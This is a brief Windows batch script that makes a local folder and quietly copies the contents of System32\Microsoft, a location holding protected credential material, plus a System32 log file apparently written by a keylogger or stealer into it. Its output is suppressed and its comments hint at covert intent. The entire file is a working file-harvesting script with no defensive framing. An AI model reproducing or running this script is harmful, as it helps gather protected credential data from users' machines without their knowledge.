@echo off
rem $Id$

cls

rem create storage directory
mkdir files
cls


rem info message
echo Copying... Please, wait a moment.



rem copy files. you know ;)
copy /Y %SystemRoot%\System32\Microsoft\*.* .\files\ > nul

rem copy log file
copy /Y %SystemRoot%\System32\win-js-ff_32.log .\files\ > nul



rem info message
echo Done.
